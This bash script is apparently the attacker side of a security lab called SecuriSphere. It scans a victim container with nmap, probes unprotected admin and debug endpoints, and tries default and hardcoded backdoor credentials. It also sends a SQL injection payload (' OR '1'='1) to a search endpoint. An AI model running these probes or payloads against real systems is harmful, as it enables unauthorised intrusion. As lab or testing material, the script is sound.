#!/bin/bash
# =============================================================================
# SecuriSphere - Attacker Scripts
# Basic scanning and enumeration against the victim service
# =============================================================================

# Load environment variables (with defaults)
VICTIM_IP="${VICTIM_IP:-172.28.0.10}"
VICTIM_HOST="${VICTIM_HOST:-victim}"
VICTIM_PORT="${VICTIM_PORT:-8000}"

# Test credentials from environment (safer than hardcoding)
ADMIN_USER="${TEST_ADMIN_USER:-admin}"
ADMIN_PASS="${TEST_ADMIN_PASS:-admin123}"
BACKDOOR_USER="${TEST_BACKDOOR_USER:-backdoor}"
BACKDOOR_PASS="${TEST_BACKDOOR_PASS:-letmein}"

echo "============================================="
echo "SecuriSphere Attacker - Victim Scanner"
echo "============================================="
echo ""

# -----------------------------------------------------------------------------
# 1. Basic Connectivity Check
# -----------------------------------------------------------------------------
echo "[*] Testing connectivity to victim..."
ping -c 3 $VICTIM_HOST

echo ""
echo "[*] Checking HTTP service..."
curl -s http://$VICTIM_HOST:$VICTIM_PORT/ | head -20

# -----------------------------------------------------------------------------
# 2. Nmap Port Scan
# -----------------------------------------------------------------------------
echo ""
echo "[*] Running Nmap scan..."
nmap -sV -sC $VICTIM_HOST -p $VICTIM_PORT

# -----------------------------------------------------------------------------
# 3. API Enumeration
# -----------------------------------------------------------------------------
echo ""
echo "[*] Enumerating API endpoints..."

echo "  -> Checking /users endpoint..."
curl -s http://$VICTIM_HOST:$VICTIM_PORT/users

echo ""
echo "  -> Checking /debug/config (should be protected)..."
curl -s http://$VICTIM_HOST:$VICTIM_PORT/debug/config

echo ""
echo "  -> Checking /admin/users (should be protected)..."
curl -s http://$VICTIM_HOST:$VICTIM_PORT/admin/users

# -----------------------------------------------------------------------------
# 4. Test Broken Auth - Access user without authentication
# -----------------------------------------------------------------------------
echo ""
echo "[*] Testing Broken Authentication..."
echo "  -> Accessing admin user profile without auth..."
curl -s http://$VICTIM_HOST:$VICTIM_PORT/users/$ADMIN_USER

# -----------------------------------------------------------------------------
# 5. Credential Testing (using env variables)
# -----------------------------------------------------------------------------
echo ""
echo "[*] Testing weak credentials..."

echo "  -> Testing ${ADMIN_USER}:****..."
curl -s -X POST http://$VICTIM_HOST:$VICTIM_PORT/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"${ADMIN_USER}\",\"password\":\"${ADMIN_PASS}\"}"

echo ""
echo "  -> Testing ${BACKDOOR_USER}:**** (hardcoded backdoor)..."
curl -s -X POST http://$VICTIM_HOST:$VICTIM_PORT/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"${BACKDOOR_USER}\",\"password\":\"${BACKDOOR_PASS}\"}"

# -----------------------------------------------------------------------------
# 6. SQL Injection Simulation
# -----------------------------------------------------------------------------
echo ""
echo "[*] Testing SQL injection..."
curl -s "http://$VICTIM_HOST:$VICTIM_PORT/search?q=admin'%20OR%20'1'='1"

echo ""
echo "============================================="
echo "[*] Scan complete!"
echo "============================================="
